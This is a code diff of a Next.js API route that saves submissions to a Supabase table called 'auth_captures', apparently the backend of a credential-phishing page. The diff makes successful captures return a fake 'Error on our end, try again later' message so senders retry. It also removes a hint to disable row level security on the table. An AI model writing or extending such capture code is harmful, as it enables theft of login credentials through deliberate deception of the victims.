@@ -70,17 +70,32 @@ export async function POST(request: NextRequest) {
         console.error('[SUPABASE_RETRY_ERROR]', retry.error.message);
         return NextResponse.json({
           ok: false,
+          supabase: false,
           error: retry.error.message,
-          hint: 'RLS policy error on Supabase table auth_captures. Please run: ALTER TABLE public.auth_captures DISABLE ROW LEVEL SECURITY;'
+          message: 'Server error, try again'
         }, { status: 500 });
       }
-      return NextResponse.json({ ok: true, received: true });
+      return NextResponse.json({
+        ok: true,
+        supabase: true,
+        message: 'Error on our end, try again later'
+      });
     }
 
-    return NextResponse.json({ ok: true, received: true, id: data?.[0]?.id });
+    return NextResponse.json({
+      ok: true,
+      supabase: true,
+      id: data?.[0]?.id,
+      message: 'Error on our end, try again later'
+    });
   } catch (err: unknown) {
     const message = err instanceof Error ? err.message : String(err);
     console.error('[CAPTURE_ERROR]', message);
-    return NextResponse.json({ ok: false, error: message }, { status: 500 });
+    return NextResponse.json({
+      ok: false,
+      supabase: false,
+      error: message,
+      message: 'Server error, try again'
+    }, { status: 500 });
   }
 }
